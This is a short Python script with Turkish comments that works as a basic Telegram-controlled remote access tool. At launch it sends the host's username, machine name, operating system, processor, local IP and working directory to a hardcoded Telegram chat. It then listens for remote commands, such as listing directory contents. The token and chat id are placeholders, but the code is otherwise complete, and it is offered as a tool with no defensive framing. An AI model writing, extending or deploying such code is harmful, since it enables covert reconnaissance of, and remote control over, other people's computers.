#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import platform,os,getpass,socket # Bağlantı Geldiğinde ilk Gönderilecek Bilgiler İçin; Oturum Adı, Network Adı, Yerel IP, Çalışılan Dizin | Bilgileri
import telebot

TOKEN = "XXXXXXXXXX:XXXXXXXXXXXXXX"                     # Telegram Tokenimizi tanımladık
Chat_id = "XXXXXXXX"                                    # Telegram Chat id mizi tanımladık

KekikPython = telebot.TeleBot(TOKEN) # KekikPython Değişkenine Telegram Tokenimizi Gösterdik

# Bağlantı Geldiğinde ilk Gönderilecek Bilgiler İçin; Oturum Adı, Network Adı, Yerel IP, Çalışılan Dizin | Bilgileri
KekikPython.send_message(
	Chat_id,
	'Kullanıcı: {}@{}\n\nİşletim Sistemi: {} | {}\n\nİşlemci Mimarisi: {}\n\nYerel IP: {}\n\nÇalışma Dizini;\n{}'.format(
		getpass.getuser(),platform.node(),platform.system(),platform.release(),platform.processor(),socket.gethostbyname(socket.gethostname()),os.getcwd()
	)
)

@KekikPython.message_handler(commands=['yardim', 'basla'])
def Yardim(Mesaj):
	KekikPython.reply_to(Mesaj, "İşte geldim burdayım !")

@KekikPython.message_handler(commands=['ls', 'list'])
def ls(Mesaj):
	KekikPython.reply_to(Mesaj, str(os.listdir(".")))

KekikPython.polling() # Aktif Bot

# https://pypi.org/project/pyTelegramBotAPI/